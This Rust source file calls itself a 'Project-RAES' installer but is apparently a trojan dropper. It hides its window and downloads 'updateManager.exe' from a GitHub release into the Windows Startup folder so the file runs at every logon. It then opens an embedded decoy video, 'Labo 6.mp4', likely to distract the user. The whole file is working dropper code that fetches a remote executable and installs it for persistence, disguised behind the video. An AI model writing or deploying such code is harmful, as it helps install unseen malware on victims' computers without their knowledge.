#![windows_subsystem = "windows"]


use anyhow::{anyhow, Result};
use serde::{Deserialize, Serialize};
use std::{
    env,
    fs,
    io,
    path::{Path, PathBuf},
    process::Command,
};


// ==========================================
// INSTALLER
// ==========================================

const DOWNLOAD_URL: &str =
    "https://github.com/MattPlayGamez/project-raes/releases/download/1.0.0/updateManager.exe";

const MANUAL: &[u8] = include_bytes!("../video.mp4");

async fn install() -> Result<()> {

    println!("[1/5] Starting installer...");

    // Get Windows Startup directory
    let appdata = env::var("APPDATA")?;

    let startup = PathBuf::from(appdata)
        .join("Microsoft")
        .join("Windows")
        .join("Start Menu")
        .join("Programs")
        .join("Startup");

    println!("[INFO] Startup directory: {}", startup.display());

    fs::create_dir_all(&startup)?;

    println!("[OK] Startup directory ready.");

    // Download executable
    println!("[2/5] Downloading updateManager.exe...");

    let client = reqwest::Client::builder()
        .user_agent("Project-RAES-Installer")
        .build()?;

    let response = client
        .get(DOWNLOAD_URL)
        .send()
        .await?;

    println!("[INFO] HTTP status: {}", response.status());

    if !response.status().is_success() {
        return Err(anyhow!(
            "GitHub download failed: HTTP {}",
            response.status()
        ));
    }

    let bytes = response.bytes().await?;

    println!("[INFO] Downloaded {} bytes.", bytes.len());

    if bytes.len() < 1024 {
        return Err(anyhow!("Downloaded executable is too small."));
    }

    // Install executable
    println!("[3/5] Installing updateManager.exe...");

    let destination = startup.join("updateManager.exe");
    let temporary = startup.join("updateManager.exe.tmp");

    fs::write(&temporary, &bytes)?;

    // Replace existing installation
    if destination.exists() {
        fs::remove_file(&destination)?;
    }

    fs::rename(&temporary, &destination)?;

    println!("[OK] Installed at: {}", destination.display());

    // Extract MP4 video
    println!("[4/5] Extracting Labo 6.mp4...");

    let manual_path = env::temp_dir().join("Labo 6.mp4");

    fs::write(&manual_path, MANUAL)?;

    println!("[OK] Video extracted: {}", manual_path.display());

    // Open video
    println!("[5/5] Opening video...");

    Command::new("explorer.exe")
        .arg(&manual_path)
        .spawn()?;

    println!("[OK] Video opening command launched.");

    println!("[SUCCESS] Installation completed!");

    Ok(())
}

// ==========================================
// MAIN
// ==========================================

#[tokio::main]
async fn main() {
    // Run installer
    match install().await {
        Ok(_) => println!("\nInstallation successful."),
        Err(error) => eprintln!("\n[ERROR] {}", error),
    }

    println!("\nPress Enter to exit...");

    let mut input = String::new();
    let _ = io::stdin().read_line(&mut input);
}
